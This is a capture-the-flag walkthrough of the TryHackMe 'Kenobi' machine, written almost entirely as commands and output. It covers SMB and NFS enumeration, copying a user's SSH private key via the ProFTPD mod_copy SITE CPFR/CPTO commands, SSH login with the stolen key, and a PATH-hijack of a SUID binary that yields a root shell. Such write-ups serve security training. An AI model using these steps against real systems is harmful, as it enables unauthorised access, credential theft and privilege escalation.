# Kenobi

## First Command
```
nmap -sC -sV

reveals 7 ports open
```

## Second Command
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip_address>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 01:17 EDT
Nmap scan report for 10.10.167.74
Host is up (0.17s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.167.74\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.167.74\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.167.74\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 26.23 seconds
```


## Third Command
Connecting to the SMB share
```
smbclient //<ip_address>/anonymous
Try "help" to get a list of possible commands.                                                                      
smb: \> dir                                                                                                         
  .                                   D        0  Wed Sep  4 06:49:09 2019                                          
  ..                                  D        0  Wed Sep  4 06:56:07 2019                                          
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019                                          
                                                                                                                    
                9204224 blocks of size 1024. 6877088 blocks available   
```

## Fourth Command

```
smbget -R smb://10.10.167.74/anonymous

Resolve error

smbclient //<ip_address>/anonymous
> get log.txt
> exit
$ less log.txt
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

```

## Fifth Command
```
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.167.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 01:24 EDT
Nmap scan report for 10.10.167.74
Host is up (0.20s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836524.0  6877104.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds

```

## mod_copy commands
http://www.proftpd.org/docs/contrib/mod_copy.html

```
└─$ nc 10.10.167.74 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.167.74]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
```

## Mounting the /var directory and getting a shell
```
mkdir <target_path>
mount <ip_address>:/var <target_path>
ls -la <target_path>
cp <target_path>/tmp/id_rsa ~/TryHackMe/Kenobi/id_rsa
cd ~/TryHackMe/Kenobi
chmod 600 id_rsa
ssh -i id_rsa kenobi@<ip_address>
cat user.txt
```

## Finding SUID files

```
$ find / -perm -u=s -type f 2>/dev/null
-or- 
$ find / -perm /4000 2>/dev/null
...

/usr/bin/menu
...
```
## Escalating Privileges
```
kenobi@kenobi:~$ echo /bin/sh > curl
kenobi@kenobi:~$ chmod 777 curl
kenobi@kenobi:~$ pwd 
/home/kenobi
kenobi@kenobi:~$ ls 
curl  share  user.txt
kenobi@kenobi:~$ export PATH=`pwd`:$PATH
enobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cd ~
# ls
curl  share  user.txt
# cd /root 
# ls
root.txt
# cat root.txt

```